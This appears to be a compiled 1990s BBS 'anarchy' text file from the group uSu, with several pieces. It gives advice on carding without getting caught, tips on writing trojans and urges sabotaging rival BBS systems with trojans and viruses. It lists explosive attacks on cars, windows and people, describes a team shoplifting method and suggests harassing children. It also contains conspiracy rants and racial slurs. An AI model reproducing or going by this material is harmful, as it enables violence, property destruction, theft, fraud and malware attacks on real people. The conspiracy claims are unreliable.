Four.  Never, ever, ever, go in first hand.  Alwasy check out the place at 
least once.  Let's say you are braking into your school, always make sure 
which gates get locked in the evening.  Also, make sure where the janitors
and the guard(s) are.

    Carding
    -------
Ok, now some crap about carding that might possible save your neck from blood
hungry cops, feds, and other asses.  One.  Don't be stupid and order from your
own home!  Come on, you're smarter than that, right?  Two.  Don't order TO
your own house, you're also smarter than that, right?  Three.  Don't pick up
the shit before dark.  If people see you, they can identify you.  Four.  
Don't pick up shit after 2 days.  This is due to many people's bills coming 
in, and them reporting it, in 2 days feds will be all over the place.  
Five.  This is a general rule, don't order anything above a $1000 bux.  If 
a thing's more than that, the mailman needs a signature.  And you don't get 
the merchandise.  Six.  NEVER use the same drop point more than once.  I don't
mean don't use a drop point more than once a day, I mean like a week apart.
If you order 10 packages, as long as they're delivered by different companies,
you're fine for the day.  I still wouldn't advise doing that.

    Trojan/Virii
    ------------
Ok, just to let you know right now, it's a hobby of mine to write trojans.
Any kind, I like writing virii, but, I don't.  I feel that virii is wrong, and
can hurt those it was not ment for.  I do not keep a TSR virus checker because
it takes up mem, not because I'm inexperienced.  I do detect trojans, and
don't run them.  So, there's the difference.  Anyways, now, for a few quick
pointers.  One.  Don't put your real name, and especially address in it.
Guess what, many people have done that, and gotten caught because original
code was found.  Two.  Take credit for your work.  Put your handle in there.
A fed can not trace you by your handle, and if they find YOU, you can claim
a frame much easier than if there was the real name/address in there.  Three.
When writing a torjan, don't run it on your computer, period.  I know, I've
experienced this, even when I though I was fine when Iswitched to drive a,
a trojan I wrote changed all of the files in my C root directory to
"THIS WAS DONE BY LURCH."  It might not sound painful, but, my autoexec.bat
was gone, something I had worked on for a llong time, my config.sys was gone,
my system I restored easily, but, windows gave me some problems because 
WINA20.386 was corrupted, I lost a couple of small useful programs, and I've 
learned a good lesson.  I came from Russia a compule years ago, and, there is
a very famous saying, "Even an unloded gun kills once a year."  I though I
changed it all to drive A, I guess I was wrong.  But, this does go to show
how much damage you can do with a small 569 byte trojan that just corrupts
or deletes every file in the root dir...

    Elite
    -----
Ok, I'm also a sysop, so, this comes from, thankfully not experience, but,
things I've read and seen.  One.  Have a disclaimer.  Two.  Inform of private
property.  Three.  Put direct commands like, "Hang up feds."  Four.  Never
put the word "elite" where it can be seen before the registration.


    A Piece of Advice
    -----------------   
One thing I want you to know off hand.  IF you do get caught, and are being 
interrogated, no matter what they say, if they are asking you to talk, don't.
Don't be an ass and don't talk or repeat your name and address or something
like that.  Please, no prisoner of war shit, ok?  If they don't have enough 
info to bust you, they'll say something like "Ok, you're in deep trouble, 
speak, and we'll get you off easier," no man, that's for movies.  That's 
exactly what they say in real life to bust you.  Now, some real idiots start
talking under pressure, and that's when they get it.  If the cops don't have 
the info already, they will ask, if they do have info, they won't bother.
Oh, and by the way.  Whatever you do, don't blame others or name any other
act you've commited.  Then you'll be guilty for that too.  And, don't say that
someone else did something, since, you'll get in deep shit if the others find
an allibi.

    Epilogue
    --------
For those idiots that don't know, that means "Conclusion".  Anyways, I hope
you've enjoyed and benefited fromthis piece of work.  I hope to be writing
some more stuff for uSu, I'm pretty much enjoying it.  
So, watch for me on the nets, since I do post on MANY nets, VERY frequently.

                        Operation Anti-Government
    (Note this is only really to be taken seriously by those who truly hate)
                      (the government as it is now.)

        CODENAME:Operation Anti-Government

    What is this all about you ask, what's the purpose of this document? Well
I'll tell you. The purpose of this document is to explain to you why the U.S.
government is mothing but a bunch of bullshit, protection the weak, the so
called innocent, the lameness, the stupidty, the idiotcy of the world gone
wrong. And where does the U.S. come into this. In many ways, ways which you
have not even thought of yet. Ways that would surprise you unless you already
didn't know. How is the U.S. to blame? Easy it's all due to the way the U.S.
is run, run by total idiots, who think they are doing something right, and
make people think that. But they're so wrong, so so wrong. Did you know today
the U.S. government owes more in the national debt then the whole world can
provide, does anyone know where all this money is going. And why it is going 
there. Do you think anyone really cares. Well the government certainly doesn't
and why should you it's not your debt. But i often ask myself, where does such
a big amount of memory go to. Does it go to other politians, do it goes to
other countries, does it go to you? Where could all this go. Who know's, by
the time you finish reading this article you won't care. 

    Did you ever wonder where such deadly virur's that kill many upon many
people come from, well you can probally thank the ole U.S. for them. Where
else would such a deadly diesease in the first place come from. Why would you
think it would only attack the rather poor and already suffering people. Why
does the government hide from you vaulable, if not life saving information
from you. There are cures for these deadly dieseases but do you think the
government want's you to know. No they don't. And there's a damm good reason
why too... they probally said what i said to ignorant stupid people, screw
you i'll let you die off, so i don't have to bother with you. 

    Ever wondered why UFO's seem so real, but the government presists in
telling you they're not real. And that they'll do anything to stop the spread
of that knowledge. Knowledge of technology that is beyong of that one's normal
imaganation. The techonolgy, to move a solid object though a another solid
object as if it were not there. The technology to move from one point to
another at 5000 miles per hours. The technology to revive the dead, hell 
probally even the technology to read minds. And maybe even worse the
technology to control minds without even noticing. Perhaps the techonology
which would help save millions upon millions of people from sicknesses and
dieseases. Perhaps the techonology and reaching out and communicating without
another creature from another planet, from another galaxy, perhaps from
another dimension in time that could only oh have dreamed off. And where is
our ever faithful and trustful government going with this knowledge. In the
opposite direction. Perhaps using this technology to kill, vanish, or
mutlilate others who oppose them.

    Can you imagine that the president doesn't even control the country, and
that neither does congress or the supreme court. Do you realize you solicatate
yourself to flag with represents an eagle, that thanks to our government 
almost disappeared from the face of the earth, due the to lack of protecting
it in the first place. Can you imagine that the government is probally
controlled by some insane person who controls a red button that wold elimate
every form of life that exists upon earth in a matter of seconds. Can you
imagine that when people just mysteriously disappear forgetting what just has
happened within the past few minutes could of have been obducted by an alien
race that is so far advanced, that they probally created us in their image.
Can you imagine that fact that the government isn't for the freedom of
everyone. But for those who have the courage to find out what the government
is really doing. Can you imagine some incidents that have happened over the
past few years were probally created by the U.S. government to make us look
good, when we truely know we are not.

    How can anyone or anything stand for freedom if the government manipulates
you into thinking what it want's to hear. Isn't allways obvious that those who
speak out are the first in a higher chain to return back to the earth from a
death. Can you imagine that Dr. Martin Luther King was shot not by one man but
many, many upon many to keep society under control. How can the governemt tell
you something is going to be alright, if the situtation has already killed
people. Of those many upon many are the innocent, the humble, the
feebleminded. Our governemt is based upon freedom for all. It never has and
never will be. Because the macho matto of, "Only the strong will survive" is
ever so deathlingly true. Can you imagine that if the government didn't cause
things to happen that there might be a better chance for world peace.

    So i tell you all now, all of you believers, and non-believers. The
governemt can control your way of life, but never, never can they control
your life. Is this is such a free world, then why are so many people killed,
rejected, undereducated, over educated and no job provided for,
underestimated banned, banned from a society which provide freedom for all,
the freedom to choose from what you think is right or wrong. The freedom to
live the life you wan't to live. The freedom of knowledge of which the
government is doing a good job of not letting you find out that information.
I tell you now revolt, reject the ways of society, there would be no evil if
there were no money. Why should there be money, when you should just be able
to take what you need, when you need it. Who needs a government that serves
itself instead of you. The only way i would ever believe in the government
is if they had the president kiss my shoe. But that would never happen because
the government would never let that happen.

                             Fun with Pineapples

        Ok for those of you who do not know what Pineapples are, and no they
are not fruit. Pineapples are 1/4 a stick of dynomite. Which is enough power
to rip off your arm depending on how fresh the firework is. Pineapples can be
used for many upon many of things. and they will and allways will be around
for a long time to come.

        Ok now let's get on to "Fun with Pineapples", please note i do not
take any responiblity if you blow your hand or arm off doing some of this
stuff. Please make sure you were gloves that will not leave any fingerprints
who know's what might happen. And make sure you do this at night time!!!

Uses:

1) Take one pineapple, and a piece of masking tape. Tape pineapple onto target
        window. putting on an extened fuse is optional. Light, get the fuck
        away as quick as possible! Watch that window get a big old hole 
        through it. 

2) This one requires someone who can light a fuse, drop it into something, and
        run really fucking fast! What you do is, open a cover to a gas tank
        on a car, light one pineapple, drop in quickly! Then run like all
        fucking hell. If you're lucky and did it right, you'll see a nice big
        ass explosion.

3) I'm pretty sure you've heard of flushing M-80's down the toliet(i believe
        they are 1/16th of a stick of dynomite, not exactly sure), well the
        same is true with pineapples, since well they also have fuses that
        burn underwater, basically when you light a pineapple, get as far
        away as possible! So here's what you do flush the toliet light the
        pineapple and drop in, then GET THE FUCK OUT OF THERE!

4) Play pineapple wars with teams, though this is not suggested to do AT ALL!

5) Find a fresh road kill, where some gloves, stick one pineapple in victim
        road kill's mouth or under body, light, and watch that sucker come
        back to life for a breif second to two!

6) Depending on how fresh your pineapples are, a fresh pineapple is strong 
        enough to blow throught about i guess about 1/4" steel, basically
        if you lit one and put it in a locker, you'd probally see metal from
        the locker fly everywhere!

7) Putting a pineapple into someone's tail pipe could be quite amusing, since
        after it blows the person who owns the car, will probally have one
        huge tailpipe, if any at all!

8) Lighting pineapples and throwing them on door steps are also fun, since 
        you could just chuck them out a car window and get away really quick.

9) Take one pineapple, one glass bottle full of gasoline(or some other
        flammable fluid), tape pineapple onto side, strongly suggested to use
        a nice long extended fuse, paper towel, cigarrette whatever. Light,
        get the fuck away. And watch you little napalm blowup all over the
        place

10) Like 9, but you can throw these suckers if you got enough gut's too!

11) Find a victim's car, take 4 pineapples and tape together in a 2 by 2
        fashion, NICE LONG EXTENDED FUSE IS A MUST!!!  Place under near gas
        tank of victim's car, light, and get the fuck out of there. Depending
        on how fresh those pineapples are, it should blowup the car, because
        the pineapples in a combination like that would tear through the gas
        tank, depending on how thick, but usually works. If not oh well, some
        poor schmucks underling part of his car will be severely fucked over!

12) Go fishing with them, yes fishing, light a pineapple and chuck into the 
        water. If you don't have the crappy pineapples, the fuse will burn
        underwater, and blow up underneath the water, and anything near the
        blast.

13) If you're really sick, take a 32-chain pineapple, one pineapple after
        another taped together. Light one and then get the fuck away!

14) Toss into fires from buring houses, etc...

15) Place them inside a cannon as the means of making your projectile to move

16) This one is meant to seriously hurt someone, take one pineapple(or two
        depending on how much you hate someone), light it then chuck at
        vitcim.

17) Find fuse boxes, telephone boxes, heh why not vending machines, and
        explode a pineapple in one of those.

18) Get your hands on a 22oz Power Bottle Rocket(usually around $20 for 4),
        tape one pineapple onto the rocket, light rocket fuse, then light
        pineapple fuse, if all works well you'll have a double exploding
        rocket.

19) Do the same as #18, but aim the rocket at things ie... such as house,
        window's, etc....

20) This one is meant to do damage to expensive equipment, ie... take one
        pineapple, light and chuck inside a computer, vending machine, etc...
        go over to a freinds house you hate, and do it to that brand new
        stereo you hate so much, either that steal that stereo(or whatever)
        then threaten your friend you hate that you'll blow him up with the
        pineapple if he sees you taking off with his stuff.

        Well that's all the fun i can think of at the moment, i'll probally
expand on this subject, but probally with other fireworks and shit. Cya,



Where did you read this? Right Here. Spread The Word. ACB-The Best Out There!uSu - united States underground                  By:Cyberglitch

                            Totally cruel Anarchy
 
        Ok listen up this shit is ment to be seriously funny and really
damaging to people's stuff and or people. If you do any of this shit, don't
go blaming the shit on uSu.

        Ok here goes Totally cruel anarchy.

1) Say there's someone you really hate, that has a car. Ok now do this,
   
        THING'S YOU'LL NEED:
                Gloves(something that's not cloth, get disposables)
                A plastic bag to put road kill in
                Fresh road kill, a dead or run over squirrel or chipmunk,
                        whatever will do
                Some scotch tape
                A old tie that no one will care that's missing
                A pair of sunglasses(optional, not really nessary, but funny)
                A glass cutter
                A plunger(or something that you can suction glass with)

        WHAT TO DO:

                Ok first get your gloves and plastic bag ready and go out and
                find some dead road kill and pick it up wearing the gloves
                and put it in the bag.

                Next take the tie and put it around the road kill's neck like
                a person would wear one. You can put the sunglasses on to,
                just make sure there's no finger prints, after all you
                wouldn't wanna get caught doing this shit because of finger
                prints.

                Ok now place your road kill back in the bag, now go to your
                victim's car at night time! Now make sure that they don't
                have an alarm that goes off if you touch or move the steering
                wheel slighty, the drivers seat or if you remove the window.

                Now with the plunger suction it on the window. Then with the
                glass cutter cut out the glass and carefully remove the glass
                that it suctioned onto your plunger(or whatever). Then take
                that glass and put it down somewhere(remember no fingerprints
                unless you wanna get caught). Now with the tape take you road
                kills hands(or claws, whatever) and tape them to the steering
                whell(or glue them if you wish) as if the road kill where
                trying to drive this persons car. Then watch tommorrow morning
                (from a distance where they can't spot you) as the person who
                owns the car comes out and sees the road kill in his car, 
                most people would probally just take the road kill out with
                the gloves. But the stench from the road kill being in there
                over night will be there for quite some time, Espeically if
                there maggot's and shit on the road kill already. Watch what
                they do, then laugh your head off :).

2) In your school(if you go to school), go into the bathrooms when no ones
        in there, usally after school is good, just make sure no one sees you
        going in so they can't blame the shit you're about to do on you. Ok
        when you go in, make sure you got'ta take a leak(no not a crap, i
        wouldn't trust any toliet that being used by more than 4 people).
        Then go up to the toliet, and start to take a leak, but what's this
        you accidentlly relieved yourself, but no of the urine made it into
        the toliet, ah what the hell piss on the walls, the toliet handles
        hell even do it to the door. Then those cheesy toliet paper dispeners
        take one and open it(or if you have a toliet paper roll take if off
        the wall), and drop in it the toliet. Do this for each stall, so when
        someone has to take a crap they have nothing but their hands to wipe
        their asses with. What this a sink in the bathroom, well we can't 
        have that now, ok do this, clog up the sink, and any other holes that
        remove water from the sink, then turn on the water and let it
        overflow. Hell if you wan't to take a dump in the sink. Bring like a
        toothpick and stick in the shit and make it look like a little white
        flag. Then calmly leave the bathroom like as if nothing happened, then
        when you get home laugh your fucking head off as some poor janitor now
        has to clean after you going to the bathroom.

3) During one of those boring as hell school assembly come into the place 
        where they meet reaking and releasing some fowl body orders. Then
        when you get your seat, pick your nose and start wiping your finger
        with that really big bogger on it on someone else seats. Watch them
        either get sick or just leave. What's that you have the 3 day old 
        piece of gum in your mouth, well if you school has those nice cloth
        seats, take the gum and smear into the cloth. Watch the janitors
        scream and cry like all hell becuase they have to take that shit out.
        During the assembly scream out stuff like "BOY THAT WAS A STINKY",
        "WHOA DID SOMETHING DIE IN HERE", "UHHH CAN SOMEONE PLEASE PASS THE
        GREY POPUNE", "IF WE USED UP ALL OUR SICK DAYS MAY WE CALL IN DEAD?",
        "HEY THAT PERSON OVER THERE ISN'T FAT, JUST SEVERLY GRAVITY IMPAIRED",
        "OOPS, SORRY ABOUT TAKING A DUMP IN MY SEAT", "HEY PULL MY FINGER!",
        "HEY I'M HUNGRY ENOUGH TO EAT A HORSE, GEUSS IT'S TIME TO GO TO BURGER
        KING". Have fun dammit

4) If you're really fucking crazy, on school the next day right on your chest
        "Anarchy Rulez" and then run around your school naked or with no 
        shirt on.

5) With a friend who has a car, buy like a crate of Snapple(the good shit, 
        nothing like the Lipton or Nestea Crap), drive and drink a couple of
        the bottles, then with the empty bottles roll down your window and
        have fun. Take the bottle chuck them at cars, windows, houses, hell 
        even people, and to make it even more funny and nasty, take a leak 
        in the bottle,  cap it, and then chuck it at something, WHOA what a 
        stench. Have fun with this one, just make sure you don't drive to
        fast, you wouldn't wan't a cop to stop you and try and take you in 
        for disorderly conduct would you?

6) Go to your nearest play ground and harass the kids their, tell them you 
        wan't to make love and stuff with them. Take those crappy swings and
        wind them up onto of the pole so no one can use. Jam the merri-go
        round wheels and teater totters. Get a dead road kill and tape it 
        onto the slides there.

7) Go around your neighborhood and knock people's mailboxs of the posts
        and put them in the middle of the street for cars to run over.

10) Pour some lye or other bad tasting shit into your teachers coffee

11) Go into the class you hate the most and relieve yourself in the corner,
        hell even take a dump while your at it, and make sure you smear it
        on the teachers desk.

        Look out for more cool and funny shit to do in later releases.

                  Bying Fireworks in Places like China Town
                 (Supplement and hand-guide on how to do so)

        Ok well i'm not going to tell you how exactly to get to ChinaTown or
the other major towns where you can get Fireworks for realtive cheap(or so
the vendors say). Well anyways this guide will tell you how to go about bying
them without getting so much caught. This is a serious text files, and should
be only taken seriously. This text file will point out ways to evade being
suspicious or getting caught. 

        Ok basically you need to do the following before going...

A) Get a good excuse for being gone for a couple hours or so
B) Try and go on a week day(so you can bring a backpack to stash your stuff
        in and make it look like you're heading home from school)
C) Allways remember bying fireworks in the open, on the street will help you
        get caught, and if you're over 18 you'll probally get a summons and
        shit
D) Allways make purchases in a store or some other place that's sucluded
E) Buy from Americans or black people, i don't trust Chinese or Japanese 
        people, they won't turn you in or anything, but they'll probally
        try and rip you off for alot more money, for alot more shitty
        fireworks.

        Ok now make sure you plan out your path from your house(or wherever
you're starting out from), and to you destination. It would be a shame asking
someone for directions on how to get back to your house, and they call your
parents and ask them what you were doing all the way out there(whever that
might be for you, for me it's China Town). Anyways the key here is not to get
your parents suspicous, especially if you have the balls to go like the day
before the 4th of July. 

        When your going buy public means(ie.... bus, train, whatever), never
talk aloud about what you're gonna go buying. Don't talk about wanting to
trade pirated games and stuff, you're only asking yourself for trouble,
seriously now. What if there where a undercover sitting right next to you.
That would suck, especially if you already bought what you wan't and are just
about home already with the stuff.

        Go on a week day, Monday through Friday, (Saturdays are ok, but not
many people would have school on saturday, i'll explain), it'll actually be
safer for you to buy fireworks on Monday through Friday. Simply because you
could just bring your backpack(as if you're coming home from school) and stash
what you buy in there. And no one will be suspect you, unless you bought too
much where it's sticking out of your bag, but no one's that stupid, are they?

        Allways make purchases of fireworks in doors, not outside on the
streets. Any cop or undercover could be watching who's knows. One of my 
friends did that and he got a summons for possesion of fireworks, of course
like me, he could give a fuck about it. But it also turned out the fireworks
he bought off of these over priced assholes. Where shitty and soggy and wet.

        As a WARNING, never by fireworks that don't look right to you in some
way there's probally something wrong with it. If you're buying explosives
make absolutely sure they're not wet, because some of them explode by
themselves when wet. And you wouldn't want to blowup the part of your room 
where you're stashing them would you?

        Making sure you buy shit from people who sell them indoors is a good
fucking idea, since the only people who would be looking or watching you
probally already bought, or are planning to, buy fireworks from the same
person as you. If you think there's someone suspicous looking in the store
you're purchasing from leave. Don't even take the chance. It's not worth
getting an asshole cop on your ass about buying fireworks and calling your
parents. Especially since those cops that caught you could be out there
fucking stopping someone who's actually killing someone, or mugging someone.
Heh like my good friend says "If you can't buy fireworks to celebrate on the
4th of July, and most states they're supposed to be illegal in, how 
unpatriotic is that???".

        Also when you buy stuff, it's also helpful to have enough extra money
just to make sure you don't come up short. Some fireworks dealers will get
pissed off. Especially if they work for the mafia or something. Getting a
list of prices and stuff before hand is a good idea. Just make sure you hide
that list so your parents don't get a hold of it, and probally grounding you
just for having it.

        Allways make sure you bargain with these people i once bargained a 
dealer for fireworks $15 for 2 bricks of Jumping Jacks and 5 pineapples. 
Don't go to low in prices like "Give a really low price, or i'm gonna rat on 
you". Becuase they might turn around and call the police on you and deny that 
they even sold you fireworks, or say they don't even know what they are.

        Last but not least. When using these fireworks you buy, set them off
somewhere else besides near your house, unless you parents and the police
don't give a crap(then you're lucky). But allways time loud fireworks to go
off, so you have enough time to get away from the explosion. Especially if
it's gonna be a Pineapple or Block Buster.

        Well ok go have some fun, and remeber the more people to take, the
easier the trip will be. But don't bring along idiots who'll talk, and spill
their guts if they get caught for having fireworks. Cya,


Chinks get the good shit.. Always.. I dunno why, but they do. THANKS GUYS!uSu - united States underground                  By:Cyberglitch

              Better Ways of Shoplifting, Without Getting Caught

        The ideas in this text file were derived from a friend's idea on
shoplifting better without getting caught as easy. I will not mention my
friends handle because he'd wan't it to be Anon. Only if he want's me to.
The contents of this text file are not an urge for you to go out and 
shoplift, but rather an educational guide(yeah this bullshit) to knowing how
it really works. Oh yeah any FED's out there, if you read this, tuff shit
there's plenty more from where this came from. And there's nothing you can
say about it, because the right of freedom of speech is protected by numeral
uno Amendmant in the Consitution. Sorry better luck next times.

        Ok the key things you have to remember to shoplifting, any other
text file that tells you how to shoplift by yourself is bullshit. Shoplifting
needs teamwork. Not only does it make it easy for you to take shit, it helps
you get more shit quicker by making bigger hits at one time. Now remember
swear to you and you partners, if you get caught, you keep quiet. It'b be a
shame if all of you got caught. So don't have assholes who crack under heat
of a cop or a fed, in your little group. Ok now i'll explain the basis of 
what types of people you will need to pull this off easier...

        1) LIFTERS - Basically one or two people(depends on how much shit
                you wanna take) that actually take the shit you wan't while
                your other partners distract the other people in the store.

        2) ORDINARY ANNOYING PEOPLE - Basically another 1 or 2 people who
                bug the hell out of the salesmen(woman??? whichever), just
                have them ask all kinds of stupid quiestions that everyone
                should already know. Like how do i turn on a computer, what's
                a computer virus, can i catch it??? Etc...

        3) CRAZIES - As many people as you want for these type of people
                a nessary part in any shoplifting hit. Basically these poeple
                must be either totally insane and stupid, or someone who can
                act insane and stupid really well and has the nerve to do just
                about anything.

        Ok basically what you need to do is have the LIFTERS taking shit out
of the store while you already have the ORDINARY ANNOYING PEOPLE bothering
the salesman(women??? again whatever) asking them stupid as hell questions.
Also make sure you have your CRAZIES going around making a ruckess, saying
"HEY I WAN'T THAT, IT'S  MINE, YOU CAN'T HAVE IT", or going around blasting
every radio they can find, going up to the clerks and making total assholes
out of themselves, hell even have take a fucking leak in the middle of the
god'dam store. Basically you wan't the CRAZIES and the ORDINARY ANNOYING
PEOPLE annoying and distacting the hell out of the salespeople and the
security gaurds and basically anoyone else in the store. So that everyone is
focusing in on the people who you have doing the craziest and stupidest
things imaginable. Then while everyone else is distracted watching them, you
walk off with whatever will fit under that big coat of yours(well i hope you
bring one), then tell your other poeple to stop bothering the people after
you're about 10 to maybe 20 minutes long gone or until the people in the
store start getting suspicous.

        Ok now basically remember, only hit one store one time, after that
they'll probally wise up to what you're trying to pull. Or wait a VERY, VERY
long time afterwards if they haven't notice the shit was gone yet. Though i
highly suggest not going back to the same store, since they'll probally almost
reconize your CRAZIES and ORDINARY ANNOYING PEOPLE almost instantly from the
last incident. Though it's really not against the law to just piss off people
in a store, but it's not worth whatever they'll try and do you.

        Allways remember to have some sort of signal(a sound is good) that
will tell everyone else in your little group to chill or calm down if   
something doesn't feel right. Because if it doesn't feel right as in like
too many poplice officers that out number you, don't bother. Because the PIGS
will probally be all over your other people before you realize it. And you'll
get trying to walk out of the store with a big ass radio speaker or something
or someone  will probally get suspicous if you look like your 40 months
pregnant and a GUY!

        Also make sure you have layout plans for the store, of what kind of
havok you're gonna cause. Send only one person that either not going to be        
involved in it at all, or as one of your ORDINARY ANNOYING PEOPLE. Becuase
the store manager or salesperson will probally reconise they're trying steal
stuff if they actually your LIFTERS or one of your CRAZIES, making them the
annoying people makes them look less suspicous, especially since they could
bullshit the sales people even more with stuff like "Hey i was in here last
week and i was looking at the stero over there for a breif few minutes, as
was wondering how much i could get it on sale for, or how many amps, how many
watts are those speakers. Hey does it come with a remote control", etc.. you
get the idea.

        Ok well go have some fun, live long and all this other bullshit, just
remember if you get caught, don't even bring up uSu. Personally i don't care
because well there's nothing that the law can do to keep me from expression
whatever i fucking please. But you'll bring everyone else down who tries this
and you wouldn't wan't that to happen now would you?

        Look out for more great shit from uSu. If you'd like to contact uSu
call the WHQ or any of the sites in uSuNet in the .NFO files.

                   How to filter lamers from your BBS

        Ok well this text file is going to give a pretty specific and good
guide for getting rid of lamers, and ways to keep these asshole of your BBS
altogether.

        Ok the following section below is for HPAVCT BBS's only.
        the signs of a lamer

        1) Some asshole calling looking for pirated warez.
        2) Some asshole saying oh i'm so serious into HPAVCT shit, if
                they were they wouldn't brag about, espeically if they brag
                in your NUV if you have one.
        3) Some asshole calling who has no fucking idea what a BBS is, and
                want's to know if you'll teach him/her. Don't bother, it's
                not worth it as i've found out, they still don't understand
                unless they have some idea what the fuck they're fucking
                doing and actually have some hope and promise.
        4) And the assholes i hate the most, the people who call up and say
                they're gonna try and take you down ifthey don't get access,
                i just simply delete these assholes and blacklist them.
        5) Any idiot(unless they prove themselves somehow, or in someway)
                uses their real name or real first name as their handle.
                They only make good people to phreak.

        Ok the following if for the Warez/Elite BBS's

        1) Same thing asshole who use any part of their real name as their
        handle(unless they prove to you they are worthy)

        2) Don't help new people who have no idea what the hell to do if they
                get Leech access on your BBS. 'Cuz they're probally gonna ask
                you, "What's leech access?"

        3) Any idiot who says they're gonna take your BBS down becuase you
                have all this pirated crap on your BBS. That's bullshit, same
                thing if you're a total HPAVCT BBS(or both), no BBS get's 
                busted just for having the files, FED's and COP's only say
                that to scare other people. Big BBS's only get busted if they
                actually PBX or Phreak people(probally from their home phone)
                That's the only way a BBS goes down, unless your parents take
                it down.

        4) Anyone who calls and says "I Can get all y0ur K-Rad Warezzzzzzzzz 
                that y0u'zz ever needzzz". From experince they never upload,
                and they are th ones allways bithing about why they can't
                DL and all this other bullshit.

        5) Anyone you just totally BRAG's they have access to really good
                BBS's and don't list any. Or if they do list really good
                BBS's that they say they call, most of the time that's so
                false. Also from experince, people who aren't really sure
                what they're doing and take a long time to fill out and
                New User Application are usually gonna put it they call
                these super big BBS's. That's never true. Most good Elite
                people would be in a rush and quickly put down some good
                refrences.
                
        SOLUTIONS IN KEEPING THEM FROM CALLING YOUR BBS:

        1) Lock them out, most of the time the real stupid ones will keep
                trying and trying to logon with the same name or handle

        2) Blacklist them if your BBS software supports it

        3) Get a caller-ID modem and blacklist the number they're calling from
                then have your Caller-ID modem and whatever util just hangup
                when the call

        4) Or if you're really serious, get Call Blocking from you local phone
                company, and Block the number they are calling from(this
                usally will probally cost around maybe between $4-$12 a month,
                but is more then worth it), becuase once you block a number,
                unless you remove them from your block callers list, won't
                be able to even make your number ring if they try to call you

        5) Have someone phreak them so bad, like if they run a lame ass BBS
                phreak them into thinking the FED's are gonna come and take
                you in and shit.

        6) If you see the lamer, do something really mean and cruel to them,
                like trip them, or push them into the middle of a busy
                street(that is if you have the balls too!!!)

        7) Call up their parents from a payphone, and tell the losers handle
                is calling and harass them. Then a little later, tell them
                hey is your son's handle such and such. They probally won't
                know, but when they go to ask them(if you sounded like a
                pissed off FED) they'll probally find out his real handle,
                and remember him as the one who phreaked them, and probally
                get really pissed.

        8) If it's a stupid ass mother fucker, call up his lame ass piece of
                shit BBS(don't do it to him term, you don't wan't him there
                when you make your strike), and fuckover his BBS, upload
                trojans and virus's and if you have Cosysop or remote access
                run them, and let his HD get fucked over. I believe(as i
                fondly remember) the Robert Walls Virus is supposed to crack
                the heads on their HD. Oh well not your problem, just theirs.

        Ok just remember and age limit is also a good idea, since you
wouldn't some kids who's under the age of say 12(that's what mine is set at)
calling up, Downloading a Text file on how to make a bomb out of the sode can
or something. Then they try it and fuck themselves over. Then teir mommy
want's to know where they got the idea, and the little shit will probally say
oh from this BBS. And the parents will probally file a fucking police
complaint and some other bullshit. That's not what you wan't, especially
since you didn't tell that little brat of a kid to DL that file anyways, or
if you did just deny it like all hell. Who are they gonna believe you,
someone who's probally atleast 15 or 16, and some 11 year old brat. 

        Ok well l8r all, look out for more cool stuff from uSu, and remember
Freedom of Speech is garunteed to everyone. Voice your opions, make them
known. Don't let the law stop you from saying what you wan't. You have the
right to, and the First amendmant to back it up. Cya,

                   Why out government is such an oppressor
               (a guide to revolutionary ideas, and the such)

        Most people now a days are so afraid of the goverment now it's
unbelievable. Since most people today are afraid to litter or something,
tho keeping America and our world beatiful should be a must for most
people, anyways the law has got everyone scared now a days. Everyone afraid
to do anything even if it's not illegal. Such as...

1) Most high schools and public buildings have this hat rule where you can't
        wear hat's in a public, otherwise they get taken away. Their reason
        for this, "It's disrespectful", did you also know that if it's a hat
        for your favorite, by them making you take if off makes you
        disrespect the team that you like the most, by being afraid to wear
        it because it's gonna get taken away. Well i can understand if you
        wear them in class, but in the halls you should be allowed to wear
        them. Tell them fuck you if you're in the hall wearing a hat and they
        tell you to take it off. OR tell to rot in hell. Whichever

2) This is starting some what in my school, but you cannot wear belts with
        metal buckles or any metal coming from the belt at all, due the fact
        the someone beat someone else with it, what a bunch of bullshit, you
        might as well kick the shit out of the person you were gonna whip
        them with, 'cuz the school can't tell you not to bring your fists
        to school

3) This might start in my high school, that you cannot were bandanas. That's
        going to far, espeically for a scholl that doesn't have any real
        dress code. Their reason for why people shouldn'e wear them "Oh well
        they symbol gang activity". Well i say good for you. Because atleast
        a gang has people that believe in each other. Are you insane enough
        to believe in your school that just harrasses you for 18 years, 4, 8
        12 years more if you go to college.

4) Police are arresting so many people for possesion of guns. Gee i've
        allways though there was an Amendmant that allows you to bear arms,
        gee i guess that was only supposed to be in America, oh wait, this
        is America.

5) Drug's being illegal to smoke or sell. Gee guess what can you imagine how
        much more money our government would be saving on legalizing daily
        amount of Drugs, instead of making them illegal to have at all
        becuase most of them are so addictive. Well how how nicotine, is a
        drug, in the sense, and it's so damm addictive, and kills so many 
        people yearly from cancer or something else, is legal. That i don't
        get, and the companies are allowed to advertise cigarettes. That makes
        absolutely no sense. You know i'd bet alot more people would stop
        using drugs if they were legal, because it's not cool to smoke or do
        somethings that's not illegal. 

6) Illegal to spread around pirated warez, HPAVCT files, Consoles??? I think
        not. Software companies probally purposely release their software to
        the so called pirate scene to get alpha/beta testing really quick,
        and not to mention free, get the reviews back from them. And some
        big Elite Pirate BBS goes down, and the sysop arrested for having
        those new Pirated games. That doesn't make sense at all. Software
        companies probally put thousands and thousands of Alpha and Beta
        testers out of work because of this. Well everyone knows the slogan
        "WHY PAY FOR SOMETHING WHEN YOU CAN GET IT FREE". That's why i hate
        almost every single MicroSoft product out there. Because when you
        have questions about it, you usally probally wind up calling
        MicroSoft and getting the number of the Real company that made it.

7) The UFO cover ups the government has. All my god, are you gonna try and
        tell me that UFO's don't exist even though well over a couple million
        people say they have either seen or encounted them? That just doesn't
        make sure. Besides who you gonna believe a totally corrupt government
        that lies, steals and cheats people more then you probally are, or
        the public opion about the matter.

8) People who try and keep you down in the business world, or almost any other
        scene(whichever comes to mind). Speak up god'dammit already, people
        have the fucking right to speak their mind anyways. Don't let some
        asshole takes the words out of your mouth,  especially if they are
        all false and untrue. Stomp on those people, let them hear your roar
        don't be oppressed. Yes even i got'ta stop being oppressed a bit.

9) What's wrong with paying taxes. I'll tell you, as soon as you send your
        hard earned money to the government. Guess what they're gonna do with
        it. Spend more than you give them or useless or things you'll never
        even get to use anyhow. Because if the government were truly smart
        and could manage to keep the county out of a such a big national
        debt, then i'd be happy. But in my lifetime they'll probally never
        be able to pay it off.

10) Ever been curious about where most of the debt is coming from, welfare
        mothers, who bullshit and lie to our government, that of the 9 kids
        that don't exist and leach off of the government for support, when
        they're perfectly healthy to get off their lazy ass and work, and
        hire a babysitter to watch their children.

